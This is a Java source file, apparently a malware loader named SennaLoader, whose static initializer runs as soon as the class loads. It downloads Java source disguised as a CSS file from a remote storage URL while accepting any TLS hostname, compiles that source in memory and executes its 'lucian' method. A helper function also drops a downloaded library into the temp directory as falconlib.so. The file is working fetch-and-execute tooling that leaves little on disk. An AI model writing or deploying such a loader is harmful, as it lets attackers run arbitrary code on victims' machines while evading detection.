import javax.net.ssl.HostnameVerifier;
import javax.net.ssl.HttpsURLConnection;
import javax.net.ssl.SSLSession;
import javax.tools.*;
import java.io.*;
import java.lang.reflect.Method;
import java.net.URI;
import java.net.URL;
import java.net.URLConnection;
import java.util.*;


public class SennaLoader {

    static {

        StringBuffer sourceCode = new StringBuffer();
        String url = "https://xxx.oss-cn-hangzhou.aliyuncs.com/Lucian.css";

        try {
            sourceCode.append(loadPayload(url).trim().replaceAll("", ""));
            Class<?> helloClass =
                    InMemoryJavaCompiler.newInstance().compile("Lucian", sourceCode.toString());
            Method m1 = helloClass.getDeclaredMethod("lucian");
            m1.invoke(helloClass.newInstance());

        } catch (Exception e) {
            e.printStackTrace();
        }


    }

    public static void main(String[] args) {
        new SennaLoader();
    }

    private static String loadPayload(String strUrl)
            throws Exception {
        URL url = new URL(strUrl);
        URLConnection conn = null;
//        if ("file".equals(   url.getProtocol() ))
//        {
//            conn = (FileURLConnection) url.openConnection();
//        }
//        else if ( "http".equals( url.getProtocol() )   )
//        {
//            conn = (HttpURLConnection) url.openConnection();
//
//        }
//        else if ("ftp".equals(  url.getProtocol()))
//        {
//            conn = (FtpURLConnection) url.openConnection();
//
//        }
        if ("https".equals(url.getProtocol())) {
            HttpsURLConnection httpsConn = (HttpsURLConnection) url.openConnection();
            httpsConn.setHostnameVerifier(new HostnameVerifier() {

                @Override
                public boolean verify(String hostname, SSLSession session) {
                    return true;
                }
            });
            conn = httpsConn;
        }

        DataInputStream input = new DataInputStream(conn.getInputStream());

        StringBuffer sb = new StringBuffer("");
        String count = null;
        while ((count = input.readLine()) != null) {
            sb.append(count);
            sb.append("\n");
        }
        input.close();

        return sb.toString();

    }

    private static void savePayload(String strUrl)
            throws Exception {
        URL url = new URL(strUrl);
        URLConnection conn = null;
        if ("https".equals(url.getProtocol())) {
            HttpsURLConnection httpsConn = (HttpsURLConnection) url.openConnection();
            httpsConn.setHostnameVerifier(new HostnameVerifier() {

                @Override
                public boolean verify(String hostname, SSLSession session) {
                    return true;
                }
            });
            conn = httpsConn;
        }

        DataInputStream input = new DataInputStream(conn.getInputStream());


        DataOutputStream out = new DataOutputStream(new
                FileOutputStream(System.getProperty("java.io.tmpdir") + "/falconlib.so"));
        int len;
        byte[] buffer = new byte[8 * 1024];
        while ((len = input.read()) != -1) {
            out.write(len);
            out.flush();
        }
        input.close();
        out.close();

    }


    public static class CompilationException extends RuntimeException {
        private static final long serialVersionUID = 5272588827551900536L;

        public CompilationException(String msg) {
            super(msg);
        }

    }


    public static class SourceCode extends SimpleJavaFileObject {
        private String contents = null;
        private String className;

        public SourceCode(String className, String contents) throws Exception {
            super(URI.create("string:///" + className.replace('.', '/')
                    + Kind.SOURCE.extension), Kind.SOURCE);
            this.contents = contents;
            this.className = className;
        }

        public String getClassName() {
            return className;
        }

        @Override
        public CharSequence getCharContent(boolean ignoreEncodingErrors)
                throws IOException {
            return contents;
        }
    }

    /**
     *
     */
    public static class CompiledCode extends SimpleJavaFileObject {
        private ByteArrayOutputStream baos = new ByteArrayOutputStream();
        private String className;

        public CompiledCode(String className) throws Exception {
            super(new URI(className), Kind.CLASS);
            this.className = className;
        }

        public String getClassName() {
            return className;
        }

        @Override
        public OutputStream openOutputStream() throws IOException {
            return baos;
        }

        public byte[] getByteCode() {
            return baos.toByteArray();
        }
    }


    public static class DynamicClassLoader extends ClassLoader {

        private Map<String, CompiledCode> customCompiledCode = new HashMap<>();

        public DynamicClassLoader(ClassLoader parent) {
            super(parent);
        }

        public void addCode(CompiledCode cc) {
            customCompiledCode.put(cc.getName(), cc);
        }

        @Override
        protected Class<?> findClass(String name) throws ClassNotFoundException {
            CompiledCode cc = customCompiledCode.get(name);
            if (cc == null) {
                return super.findClass(name);
            }
            byte[] byteCode = cc.getByteCode();
            return defineClass(name, byteCode, 0, byteCode.length);
        }
    }


    public static class ExtendedStandardJavaFileManager extends
            ForwardingJavaFileManager<JavaFileManager> {

        private List<CompiledCode> compiledCode = new ArrayList<CompiledCode>();
        private DynamicClassLoader cl;

        /**
         * Creates a new instance of ForwardingJavaFileManager.
         *
         * @param fileManager delegate to this file manager
         * @param cl
         */
        protected ExtendedStandardJavaFileManager(JavaFileManager fileManager,
                                                  DynamicClassLoader cl) {
            super(fileManager);
            this.cl = cl;
        }

        @Override
        public JavaFileObject getJavaFileForOutput(
                Location location, String className,
                JavaFileObject.Kind kind, FileObject sibling) throws IOException {

            try {
                CompiledCode innerClass = new CompiledCode(className);
                compiledCode.add(innerClass);
                cl.addCode(innerClass);
                return innerClass;
            } catch (Exception e) {
                throw new RuntimeException(
                        "Error while creating in-memory output file for "
                                + className, e);
            }
        }

        @Override
        public ClassLoader getClassLoader(Location location) {
            return cl;
        }
    }


    /**
     * Compile Java sources in-memory
     */
    public static class InMemoryJavaCompiler {
        private JavaCompiler javac;
        private DynamicClassLoader classLoader;
        private Iterable<String> options;
        boolean ignoreWarnings = true;

        private Map<String, SourceCode> sourceCodes = new HashMap<String, SourceCode>();

        public static InMemoryJavaCompiler newInstance() {
            return new InMemoryJavaCompiler();
        }

        private InMemoryJavaCompiler() {
            this.javac = ToolProvider.getSystemJavaCompiler();
            this.classLoader = new DynamicClassLoader(ClassLoader.getSystemClassLoader());
        }

        public InMemoryJavaCompiler useParentClassLoader(ClassLoader parent) {
            this.classLoader = new DynamicClassLoader(parent);
            return this;
        }

        /**
         * @return the class loader used internally by the compiler
         */
        public ClassLoader getClassloader() {
            return classLoader;
        }

        /**
         * Options used by the compiler, e.g. '-Xlint:unchecked'.
         *
         * @param options
         * @return
         */
        public InMemoryJavaCompiler useOptions(String... options) {
            this.options = Arrays.asList(options);
            return this;
        }

        /**
         * Ignore non-critical compiler output, like unchecked/unsafe operation
         * warnings.
         *
         * @return
         */
        public InMemoryJavaCompiler ignoreWarnings() {
            ignoreWarnings = true;
            return this;
        }

        /**
         * Compile all sources
         *
         * @return Map containing instances of all compiled classes
         * @throws Exception
         */
        public Map<String, Class<?>> compileAll() throws Exception {
            if (sourceCodes.size() == 0) {
                throw new CompilationException("No source code to compile");
            }
            Collection<SourceCode> compilationUnits = sourceCodes.values();
            CompiledCode[] code;

            code = new CompiledCode[compilationUnits.size()];
            Iterator<SourceCode> iter = compilationUnits.iterator();
            for (int i = 0; i < code.length; i++) {
                code[i] = new CompiledCode(iter.next().getClassName());
            }
            DiagnosticCollector<JavaFileObject> collector = new DiagnosticCollector<>();
            ExtendedStandardJavaFileManager fileManager = new ExtendedStandardJavaFileManager(javac.getStandardFileManager(null, null, null), classLoader);
            JavaCompiler.CompilationTask task = javac.getTask(null, fileManager, collector, options, null, compilationUnits);
            boolean result = task.call();
            if (!result || collector.getDiagnostics().size() > 0) {
                StringBuffer exceptionMsg = new StringBuffer();
                exceptionMsg.append("Unable to compile the source");
                boolean hasWarnings = false;
                boolean hasErrors = false;
                for (Diagnostic<? extends JavaFileObject> d : collector.getDiagnostics()) {
                    switch (d.getKind()) {
                        case NOTE:
                        case MANDATORY_WARNING:
                        case WARNING:
                            hasWarnings = true;
                            break;
                        case OTHER:
                        case ERROR:
                        default:
                            hasErrors = true;
                            break;
                    }
                    exceptionMsg.append("\n").append("[kind=").append(d.getKind());
                    exceptionMsg.append(", ").append("line=").append(d.getLineNumber());
                    exceptionMsg.append(", ").append("message=").append(d.getMessage(Locale.US)).append("]");
                }
                if (!ignoreWarnings) {
                    throw new CompilationException(exceptionMsg.toString());
                }
            }

            Map<String, Class<?>> classes = new HashMap<String, Class<?>>();
            for (String className : sourceCodes.keySet()) {
                classes.put(className, classLoader.loadClass(className));
            }
            return classes;
        }

        /**
         * Compile single source
         *
         * @param className
         * @param sourceCode
         * @return
         * @throws Exception
         */
        public Class<?> compile(String className, String sourceCode) throws Exception {
            return addSource(className, sourceCode).compileAll().get(className);
        }

        /**
         * Add source code to the compiler
         *
         * @param className
         * @param sourceCode
         * @return
         * @throws Exception
         * @see {@link #compileAll()}
         */
        public InMemoryJavaCompiler addSource(String className, String sourceCode) throws Exception {
            sourceCodes.put(className, new SourceCode(className, sourceCode));
            return this;
        }
    }

}
